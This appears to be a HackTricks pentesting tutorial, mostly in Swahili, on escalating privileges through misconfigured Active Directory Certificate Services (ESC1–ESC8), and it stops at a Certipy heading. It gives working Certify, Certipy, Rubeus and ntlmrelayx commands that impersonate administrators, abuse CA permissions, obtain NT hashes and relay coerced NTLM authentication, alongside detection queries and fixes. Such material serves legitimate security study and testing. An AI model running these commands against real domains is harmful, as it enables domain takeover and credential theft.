# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Huu ni muhtasari wa sehemu za mbinu za escalation katika machapisho haya:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Maelezo

### Misconfigured Certificate Templates - ESC1 Imeelezwa

- **Haki za enrolment zimetolewa kwa users wenye privileges ndogo na Enterprise CA.**
- **Idhini ya manager haihitajiki.**
- **Hakuna signatures kutoka kwa personnel walioidhinishwa zinazohitajika.**
- **Security descriptors kwenye certificate templates zina ruhusa nyingi kupita kiasi, na kuruhusu users wenye privileges ndogo kupata haki za enrolment.**
- **Certificate templates zimesanidiwa kufafanua EKUs zinazowezesha authentication:**
- Vitambulisho vya Extended Key Usage (EKU) kama vile Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), au kutokuwepo kwa EKU (SubCA) vimejumuishwa.
- **Uwezo wa requesters kujumuisha subjectAltName katika Certificate Signing Request (CSR) unaruhusiwa na template:**
- Active Directory (AD) huipa kipaumbele subjectAltName (SAN) katika certificate kwa ajili ya identity verification ikiwa ipo. Hii inamaanisha kwamba kwa kubainisha SAN katika CSR, certificate inaweza kuombwa ili ku-impersonate user yeyote (kwa mfano, domain administrator). Ikiwa SAN inaweza kubainishwa na requester, inaonyeshwa katika AD object ya certificate template kupitia property ya `mspki-certificate-name-flag`. Property hii ni bitmask, na uwepo wa flag ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` unaruhusu requester kubainisha SAN.

> [!CAUTION]
> Configuration iliyoelezwa inawaruhusu users wenye privileges ndogo kuomba certificates zenye SAN yoyote wanayochagua, na hivyo kuwezesha authentication kama domain principal yeyote kupitia Kerberos au SChannel.

Feature hii wakati mwingine huwezeshwa ili kusaidia uundaji wa HTTPS au host certificates kwa wakati huo huo na products au deployment services, au kutokana na ukosefu wa uelewa.

Imebainika kuwa kuunda certificate yenye option hii husababisha warning, jambo ambalo halitokei wakati existing certificate template (kama vile template ya `WebServer`, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ikiwa enabled) inaduplicate na kisha kurekebishwa ili kujumuisha authentication OID.

### Abuse

Ili **kupata certificate templates zilizo vulnerable** unaweza kuendesha:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Ili **kutumia vibaya udhaifu huu kujifanya msimamizi**, mtu anaweza kuendesha:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Kisha unaweza kubadilisha **cheti kuwa katika umbizo la `.pfx`** na kukitumia **kuthibitisha utambulisho kwa kutumia Rubeus au certipy** tena:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binaries za Windows "Certreq.exe" na "Certutil.exe" zinaweza kutumiwa kutengeneza PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Uorodheshaji wa certificate templates ndani ya configuration schema ya AD Forest, hasa zile zisizohitaji approval au signatures, zenye EKU ya Client Authentication au Smart Card Logon, na zilizo na flag ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ikiwa enabled, unaweza kufanywa kwa kuendesha LDAP query ifuatayo:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Certificate Templates Zisizosanidiwa Vizuri - ESC2

### Maelezo

Hali ya pili ya abuse ni tofauti ya hali ya kwanza:

1. Haki za enrollment zinatolewa kwa low-privileged users na Enterprise CA.
2. Sharti la manager approval limezimwa.
3. Hitaji la authorized signatures limeondolewa.
4. Security descriptor yenye ruhusa nyingi kupita kiasi kwenye certificate template inawapa low-privileged users haki za certificate enrollment.
5. **Certificate template imefafanuliwa kujumuisha Any Purpose EKU au kutokuwa na EKU.**

**Any Purpose EKU** inaruhusu certificate kupatikana na attacker kwa **purpose yoyote**, ikijumuisha client authentication, server authentication, code signing, n.k. **Technique iliyotumiwa kwa ESC3** inaweza kutumika kutumia hali hii.

Certificates zisizo na **EKUs**, ambazo hufanya kazi kama subordinate CA certificates, zinaweza kutumiwa kwa **purpose yoyote** na **pia kutumika kusaini certificates mpya**. Kwa hivyo, attacker anaweza kubainisha EKUs au fields zozote katika certificates mpya kwa kutumia subordinate CA certificate.

Hata hivyo, certificates mpya zilizoundwa kwa ajili ya **domain authentication** hazitafanya kazi ikiwa subordinate CA haiaminiki na object ya **`NTAuthCertificates`**, ambayo ndiyo setting ya default. Hata hivyo, attacker bado anaweza kuunda **certificates mpya zenye EKU yoyote** na certificate values za kiholela. Hizi zinaweza **kutumiwa vibaya** kwa purposes mbalimbali (kwa mfano, code signing, server authentication, n.k.) na zinaweza kuwa na athari kubwa kwa applications nyingine kwenye network kama vile SAML, AD FS, au IPSec.

Ili ku-enumerate templates zinazolingana na hali hii ndani ya configuration schema ya AD Forest, LDAP query ifuatayo inaweza kutekelezwa:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Templates za Enrollment Agent Zisizosanidiwa Vizuri - ESC3

### Maelezo

Hali hii ni kama ya kwanza na ya pili, lakini **inatumia vibaya** **EKU tofauti** (Certificate Request Agent) na **templates 2 tofauti** (kwa hiyo ina seti 2 za mahitaji),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Enrollment Agent** katika nyaraka za Microsoft, humruhusu principal **ku-enroll** kwa ajili ya **certificate** kwa **niaba ya mtumiaji mwingine**.

**“Enrollment agent”** hu-enroll katika **template** kama hiyo na hutumia **certificate inayopatikana kusaini kwa pamoja CSR kwa niaba ya mtumiaji mwingine**. Kisha **hutuma** **CSR iliyosainiwa kwa pamoja** kwa CA, na ku-enroll katika **template** inayoruhusu **“enroll on behalf of”**, ambapo CA hujibu kwa **certificate inayomilikiwa na mtumiaji “mwingine”**.

**Mahitaji 1:**

- Haki za enrollment zimepewa watumiaji wenye privileges chache na Enterprise CA.
- Sharti la idhini ya manager limeachwa.
- Hakuna sharti la signatures zilizoidhinishwa.
- Security descriptor ya certificate template inaruhusu mambo kupita kiasi, na kuwapa watumiaji wenye privileges chache haki za enrollment.
- Certificate template inajumuisha Certificate Request Agent EKU, inayowezesha kuomba certificate za certificate templates nyingine kwa niaba ya principals wengine.

**Mahitaji 2:**

- Enterprise CA inawapa watumiaji wenye privileges chache haki za enrollment.
- Idhini ya manager inapitwa.
- Toleo la schema la template ni 1 au linazidi 2, na linabainisha Application Policy Issuance Requirement inayohitaji Certificate Request Agent EKU.
- EKU iliyobainishwa katika certificate template inaruhusu domain authentication.
- Vizuizi vya enrollment agents havitumiki kwenye CA.

### Unyonyaji

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kutumia vibaya hali hii:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**watumiaji** wanaoruhusiwa **kupata** **enrollment agent certificate**, templates ambazo **agents** wa enrollment wanaruhusiwa kutumia kufanya enrollment, na **accounts** ambazo enrollment agent anaweza kuziwakilisha, zinaweza kudhibitiwa na enterprise CAs. Hili hufanywa kwa kufungua `certsrc.msc` **snap-in**, **kubofya-kulia CA**, **kubofya Properties**, kisha **kwenda** kwenye kichupo cha “Enrollment Agents”.

Hata hivyo, inabainishwa kuwa mpangilio wa **default** wa CAs ni “**Do not restrict enrollment agents**.” Wakati restriction ya enrollment agents imewezeshwa na administrators, kwa kuiweka kuwa “Restrict enrollment agents,” configuration ya default bado inaruhusu sana. Inawaruhusu **Everyone** kupata access ya kufanya enrollment katika templates zote kama mtu yeyote.

## Udhibiti wa Access wa Vulnerable Certificate Template - ESC4

### **Maelezo**

**security descriptor** kwenye **certificate templates** hufafanua **permissions** ambazo **AD principals** mahususi wanazo kuhusiana na template hiyo.

Iwapo **attacker** ana **permissions** zinazohitajika za **kubadilisha** **template** na **kuanzisha** misconfigurations zozote zinazoweza kutumiwa vibaya zilizoelezwa katika **sehemu zilizotangulia**, privilege escalation inaweza kuwezeshwa.

Permissions muhimu zinazotumika kwa certificate templates ni pamoja na:

- **Owner:** Hutoa udhibiti wa moja kwa moja juu ya object, na kuruhusu kubadilisha attributes yoyote.
- **FullControl:** Hutoa mamlaka kamili juu ya object, ikiwa ni pamoja na uwezo wa kubadilisha attributes yoyote.
- **WriteOwner:** Huruhusu kubadilisha owner wa object kuwa principal aliye chini ya udhibiti wa attacker.
- **WriteDacl:** Huruhusu kurekebisha access controls, jambo linaloweza kumpa attacker FullControl.
- **WriteProperty:** Huruhusu kuhariri object properties zozote.

### Abuse

Ili kubaini principals walio na haki za kuhariri templates na PKI objects nyingine, fanya enumeration kwa kutumia Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Mfano wa privesc kama ule wa awali:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ni hali ambapo mtumiaji ana write privileges juu ya certificate template. Hili linaweza, kwa mfano, kutumiwa vibaya kubadilisha configuration ya certificate template ili kufanya template iwe vulnerable kwa ESC1.

Kama tunavyoweza kuona kwenye path iliyo hapo juu, ni `JOHNPC` pekee aliye na privileges hizi, lakini user wetu `JOHN` ana edge mpya ya `AddKeyCredentialLink` kuelekea `JOHNPC`. Kwa kuwa technique hii inahusiana na certificates, nimeimplement pia attack hii, ambayo inajulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hapa kuna muhtasari mfupi wa command ya `shadow auto` ya Certipy ya kupata NT hash ya victim.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** inaweza kubadilisha configuration ya certificate template kwa command moja. Kwa **default**, Certipy **itaandika upya** configuration ili kuifanya iwe **vulnerable to ESC1**. Tunaweza pia kubainisha **`-save-old` parameter ili kuhifadhi configuration ya zamani**, jambo litakalokuwa muhimu kwa **kurejesha** configuration baada ya attack yetu.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Udhibiti wa Ufikiaji wa PKI Object Ulio Hatarini - ESC5

### Maelezo

Mtandao mpana wa mahusiano yanayotegemea ACL, unaojumuisha objects kadhaa zaidi ya certificate templates na certificate authority, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Objects hizi, ambazo zinaweza kuathiri kwa kiasi kikubwa usalama, zinajumuisha:

- AD computer object ya CA server, ambayo inaweza kuathiriwa kupitia mbinu kama S4U2Self au S4U2Proxy.
- RPC/DCOM server ya CA server.
- AD object au container yoyote ya descendant ndani ya njia maalum ya container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini haiishii kwenye, containers na objects kama Certificate Templates container, Certification Authorities container, NTAuthCertificates object, na Enrollment Services Container.

Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa attacker mwenye privileges ndogo ataweza kudhibiti mojawapo ya vipengele hivi muhimu.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Maelezo

Mada iliyojadiliwa katika [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama ilivyoelezwa na Microsoft. Configuration hii, inapowashwa kwenye Certification Authority (CA), inaruhusu kuongezwa kwa **values zilizofafanuliwa na mtumiaji** kwenye **subject alternative name** kwa **request** yoyote, ikijumuisha zile zinazoundwa kutoka Active Directory®. Kwa hivyo, uwezo huu unamruhusu **intruder** ku-enroll kupitia **template** yoyote iliyowekwa kwa ajili ya **domain authentication**—hasa zile zinazoruhusu user enrollment kwa **unprivileged** users, kama User template ya kawaida. Kwa sababu hiyo, certificate inaweza kupatikana, na kumwezesha intruder ku-authenticate kama domain administrator au **entity nyingine yoyote inayotumika** ndani ya domain.

**Kumbuka**: Mbinu ya kuongeza **alternative names** kwenye Certificate Signing Request (CSR), kupitia argument ya `-attrib "SAN:"` katika `certreq.exe` (inayojulikana kama “Name Value Pairs”), ni **tofauti** na strategy ya exploitation ya SANs katika ESC1. Tofauti hapa iko katika **jinsi taarifa za account zinavyowekwa**—ndani ya certificate attribute, badala ya extension.

### Abuse

Ili kuthibitisha ikiwa setting imewashwa, mashirika yanaweza kutumia command ifuatayo pamoja na `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Operesheni hii kimsingi hutumia **remote registry access**, hivyo, mbinu mbadala inaweza kuwa:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zinaweza kugundua mipangilio hii isiyo sahihi na kuitumia:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Ili kubadilisha mipangilio hii, kwa kudhaniwa kuwa mtu ana **domain administrative** rights au haki zinazolingana, amri ifuatayo inaweza kutekelezwa kutoka workstation yoyote:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Ili kuzima usanidi huu katika mazingira yako, flag inaweza kuondolewa kwa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Baada ya security updates za Mei 2022, **certificates** zitakazotolewa mpya zitakuwa na **security extension** inayojumuisha **property ya `objectSid` ya requester**. Kwa ESC1, SID hii inatokana na SAN iliyobainishwa. Hata hivyo, kwa **ESC6**, SID inaakisi **`objectSid` ya requester**, si SAN.\
> Ili ku-exploit ESC6, ni muhimu mfumo uwe susceptible kwa ESC10 (Weak Certificate Mappings), ambayo hutanguliza **SAN kuliko security extension mpya**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Access control ya certificate authority hudhibitiwa kupitia seti ya permissions zinazosimamia vitendo vya CA. Permissions hizi zinaweza kuonekana kwa kufungua `certsrv.msc`, kubofya kulia CA, kuchagua properties, kisha kwenda kwenye kichupo cha Security. Aidha, permissions zinaweza ku-enumerate kwa kutumia module ya PSPKI pamoja na commands kama:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hii inatoa maarifa kuhusu haki kuu, ambazo ni **`ManageCA`** na **`ManageCertificates`**, zinazohusiana na majukumu ya “CA administrator” na “Certificate Manager” mtawalia.

#### Abuse

Kuwa na haki za **`ManageCA`** kwenye certificate authority humwezesha principal kubadilisha mipangilio kwa mbali kwa kutumia PSPKI. Hii inajumuisha kuwasha flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu kubainishwa kwa SAN katika template yoyote, jambo muhimu katika domain escalation.

Kurahisisha mchakato huu kunawezekana kwa kutumia cmdlet ya PSPKI ya **Enable-PolicyModuleFlag**, inayoruhusu mabadiliko bila kuingiliana moja kwa moja na GUI.

Kuwa na haki za **`ManageCertificates`** huwezesha kuidhinisha requests zinazosubiri, na hivyo kukwepa ulinzi wa “CA certificate manager approval”.

Mchanganyiko wa modules za **Certify** na **PSPKI** unaweza kutumika kuomba, kuidhinisha na kupakua certificate:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Maelezo

> [!WARNING]
> Katika **attack ya awali**, ruhusa za **`Manage CA`** zilitumika **kuwezesha** flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kutekeleza **ESC6 attack**, lakini hii haitakuwa na athari hadi huduma ya CA (`CertSvc`) ianzishwe upya. Mtumiaji anapokuwa na haki ya ufikiaji ya `Manage CA`, pia anaruhusiwa **kuanzisha upya huduma**. Hata hivyo, hii **haimaanishi kwamba mtumiaji anaweza kuanzisha upya huduma kwa mbali**. Zaidi ya hayo, **ESC6 huenda isifanye kazi moja kwa moja** katika mazingira mengi yaliyofanyiwa patch kutokana na security updates za Mei 2022.

Kwa hiyo, attack nyingine inaonyeshwa hapa.

Masharti ya lazima:

- Ruhusa ya **`ManageCA`** pekee
- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa kutoka **`ManageCA`**)
- Certificate template **`SubCA`** lazima iwe **imewezeshwa** (inaweza kuwezeshwa kutoka **`ManageCA`**)

Technique hii inategemea ukweli kwamba watumiaji walio na haki za ufikiaji za `Manage CA` _na_ `Manage Certificates` wanaweza **kutoa certificate requests zilizoshindikana**. Certificate template ya **`SubCA`** iko **vulnerable kwa ESC1**, lakini **administrators pekee** ndio wanaoweza ku-enroll kwenye template hiyo. Kwa hivyo, **mtumiaji** anaweza **kuomba** ku-enroll kwenye **`SubCA`** - ombi hilo **litakataliwa** - lakini **baadaye litatolewa na manager**.

#### Matumizi mabaya

Unaweza **kujipatia haki ya ufikiaji ya `Manage Certificates`** kwa kumuongeza mtumiaji wako kama officer mpya.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Template ya **`SubCA`** inaweza **kuwezeshwa kwenye CA** kwa kutumia parameter ya `-enable-template`. Kwa chaguo-msingi, template ya `SubCA` imewezeshwa.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ikiwa tumetimiza masharti ya awali ya attack hii, tunaweza kuanza kwa **kuomba certificate kulingana na template ya `SubCA`**.

**Ombi hili litakataliwa**, lakini tutahifadhi private key na kuandika ID ya ombi.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Kwa kutumia **`Manage CA` na `Manage Certificates`**, tunaweza kisha **kutoa ombi la certificate lililoshindwa** kwa amri ya `ca` na parameter ya `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na hatimaye, tunaweza **kupata certificate iliyotolewa** kwa kutumia command ya `req` na parameter ya `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Shambulio la 3 – Abuse ya Manage Certificates Extension (SetExtension)

#### Maelezo

Mbali na abuse za kawaida za ESC7 (kuwezesha sifa za EDITF au kuidhinisha requests zinazosubiri), **Certify 2.0** ilifichua primitive mpya kabisa inayohitaji tu role ya *Manage Certificates* (pia huitwa **Certificate Manager / Officer**) kwenye Enterprise CA.

Mbinu ya RPC ya `ICertAdmin::SetExtension` inaweza kutekelezwa na principal yoyote mwenye *Manage Certificates*. Ingawa kwa kawaida mbinu hii ilitumiwa na CAs halali kusasisha extensions kwenye requests **pending**, attacker anaweza kuitumia vibaya **kuongeza certificate extension isiyo ya default** (kwa mfano OID maalum ya *Certificate Issuance Policy* kama `1.1.1.1`) kwenye request inayosubiri approval.

Kwa sababu template inayolengwa **haijaainisha default value ya extension hiyo**, CA **HAITAANDIKA juu ya** value inayodhibitiwa na attacker wakati request itakapotolewa hatimaye. Kwa hiyo, certificate inayotokana ina extension iliyochaguliwa na attacker ambayo inaweza:

* Kutimiza mahitaji ya Application / Issuance Policy ya templates nyingine zilizo vulnerable (na kusababisha privilege escalation).
* Kuingiza EKUs au policies za ziada zinazowapa certificate trust isiyotarajiwa katika third-party systems.

Kwa ufupi, *Manage Certificates* – ambayo hapo awali ilionekana kuwa nusu “isiyo na nguvu zaidi” ya ESC7 – sasa inaweza kutumiwa kwa privilege escalation kamili au persistence ya muda mrefu, bila kugusa CA configuration au kuhitaji right yenye masharti makali zaidi ya *Manage CA*.

#### Kutumia primitive hii vibaya kwa Certify 2.0

1. **Tuma certificate request ambayo itabaki kuwa *pending*.** Hili linaweza kulazimishwa kwa template inayohitaji manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Ongeza extension maalum kwenye request iliyo pending** kwa kutumia command mpya ya `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ikiwa template haijaainisha tayari extension ya *Certificate Issuance Policies*, value iliyo hapo juu itahifadhiwa baada ya issuance.*

3. **Issue request** (ikiwa role yako pia ina approval rights za *Manage Certificates*) au subiri operator ai-approve. Baada ya ku-issued, download certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Certificate inayotokana sasa ina malicious issuance-policy OID na inaweza kutumika katika attacks zinazofuata (kwa mfano ESC13, domain escalation, n.k.).

> NOTE:  Attack hiyo hiyo inaweza kutekelezwa kwa Certipy ≥ 4.7 kupitia command ya `ca` na parameter ya `-set-extension`.

## NTLM Relay kwa AD CS HTTP Endpoints – ESC8

### Maelezo

> [!TIP]
> Katika environments ambako **AD CS imewekwa**, ikiwa kuna **web enrollment endpoint vulnerable** na angalau **certificate template moja imechapishwa** inayoruhusu domain computer enrollment na client authentication (kama template ya default ya **`Machine`**), basi inawezekana kwa **computer yoyote yenye spooler service active kucompromise na attacker**!

**HTTP-based enrollment methods** kadhaa zinaungwa mkono na AD CS, na zinapatikana kupitia server roles za ziada ambazo administrators wanaweza kusakinisha. Interfaces hizi za HTTP-based certificate enrollment ziko vulnerable kwa **NTLM relay attacks**. Attacker, kutoka kwenye **compromised machine, anaweza ku-impersonate AD account yoyote inayofanya authentication kupitia inbound NTLM**. Anapokuwa ana-impersonate victim account, attacker anaweza kufikia web interfaces hizi na **ku-request client authentication certificate kwa kutumia `User` au `Machine` certificate templates**.

- **Web enrollment interface** (ASP application ya zamani inayopatikana kwenye `http://<caserver>/certsrv/`), kwa default hutumia HTTP pekee, ambayo haitoi ulinzi dhidi ya NTLM relay attacks. Zaidi ya hayo, inaruhusu waziwazi NTLM authentication pekee kupitia Authorization HTTP header yake, hivyo kufanya authentication methods salama zaidi kama Kerberos zisiweze kutumika.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, na **Network Device Enrollment Service** (NDES) kwa default zinaunga mkono negotiate authentication kupitia Authorization HTTP header yao. Negotiate authentication **inaunga mkono Kerberos na NTLM**, na kumruhusu attacker **kushusha authentication hadi NTLM** wakati wa relay attacks. Ingawa web services hizi zinawezesha HTTPS kwa default, HTTPS pekee **hailindi dhidi ya NTLM relay attacks**. Ulinzi dhidi ya NTLM relay attacks kwa HTTPS services unawezekana tu wakati HTTPS imeunganishwa na channel binding. Kwa bahati mbaya, AD CS haiwezeshi Extended Protection for Authentication kwenye IIS, ambayo inahitajika kwa channel binding.

**Tatizo** la kawaida la NTLM relay attacks ni **muda mfupi wa NTLM sessions** na kutoweza kwa attacker ku-interact na services zinazohitaji **NTLM signing**.

Hata hivyo, limitation hii inatatuliwa kwa kutumia NTLM relay attack kupata certificate ya user, kwa sababu validity period ya certificate ndiyo huamua muda wa session, na certificate inaweza kutumiwa na services ambazo **zinalazimisha NTLM signing**. Kwa maelekezo ya kutumia stolen certificate, rejelea:


{{#ref}}
account-persistence.md
{{#endref}}

Limitation nyingine ya NTLM relay attacks ni kwamba **machine inayodhibitiwa na attacker lazima i-authenticatediwe na victim account**. Attacker anaweza kusubiri au kujaribu **kulazimisha** authentication hii:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` ina-enumerate **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Sifa ya `msPKI-Enrollment-Servers` hutumiwa na enterprise Certificate Authorities (CAs) kuhifadhi endpoints za Certificate Enrollment Service (CES). Endpoints hizi zinaweza kuchanganuliwa na kuorodheshwa kwa kutumia tool **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuse kwa kutumia Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Matumizi mabaya kwa [Certipy](https://github.com/ly4k/Certipy)

